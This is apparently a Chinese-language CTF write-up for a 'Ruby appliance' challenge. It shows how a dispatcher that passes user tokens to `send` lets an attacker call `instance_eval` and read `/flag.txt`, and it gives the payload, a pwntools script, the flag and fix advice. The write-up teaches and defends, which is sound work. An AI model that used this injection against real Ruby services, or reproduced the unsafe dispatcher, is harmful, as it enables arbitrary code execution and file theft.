# Ruby appliance

## 题目简述

题目提供一个 Ruby 命令行设备，表面上只允许执行 `help`、`echo`、`date`、`ip`、`colors`、`get_flag` 和 `exit` 等菜单命令。`get_flag` 中确实存在读取 `/flag.txt` 的代码，但在它之前有无条件 `return`，因此直接调用只会返回。

真正的漏洞位于命令分派器：程序把整行输入按空白拆成 token，然后直接执行 `send(*tokens)`。它没有把方法名限制在菜单命令中，因此当前对象继承到的 Ruby 反射与求值方法也能被远程调用。

## 解题过程

命令执行逻辑只有几行：

```ruby
def run(cmd)
  tokens = cmd.chomp.split
  begin
    send(*tokens) unless tokens.empty?
  rescue NoMethodError => e
    puts "No command #{tokens[0]}"
    help
  end
end
```

例如输入 `echo hello` 时，`tokens` 为 `['echo', 'hello']`，等价于调用 `send('echo', 'hello')`。问题在于 `send` 不会只查找 `ApplianceTUI` 自己定义的方法；从祖先类继承而来的 `instance_eval` 同样可被调用。

`instance_eval` 接受一段字符串，并在接收者对象的上下文中把它作为 Ruby 代码执行。由于服务先按空白切分，求值字符串应写成不含空格的单个 token。以下一行正好满足要求：

```text
instance_eval puts(File.read('/flag.txt'))
```

它会被解释为：

```ruby
send("instance_eval", "puts(File.read('/flag.txt'))")
```

第二个 token 随后由 `instance_eval` 解析，而不是由命令分派器解析，因此其中可以调用 `File.read` 读取真正的 flag 文件。连接服务并发送该载荷即可得到：

```text
shellmates{wh4t_4re_th3se_m3thods_d0ing_h3re?}
```

若使用 pwntools，可以直接自动化交互：

```python
from pwn import remote

io = remote("127.0.0.1", 1337)
io.sendlineafter(
    b" >",
    b"instance_eval puts(File.read('/flag.txt'))",
)
print(io.recvuntil(b"}").decode())
io.close()
```

## 方法总结

本题是典型的动态方法分派越权。菜单中隐藏危险方法或在 `get_flag` 前加入 `return` 都不是安全边界，因为 `send` 接受攻击者控制的方法名，并将整个 Ruby 对象模型暴露了出来。攻击者无需绕过那条 `return`，只需换一条继承方法的调用路径就能直接求值代码。

修复时应建立显式允许列表，把外部命令映射到固定方法，而不是把用户输入原样交给 `send`。还应避免在具有敏感文件权限的进程中暴露 `eval`、`instance_eval`、`class_eval` 等动态求值入口；参数也要按每条命令的预期类型单独解析和校验。
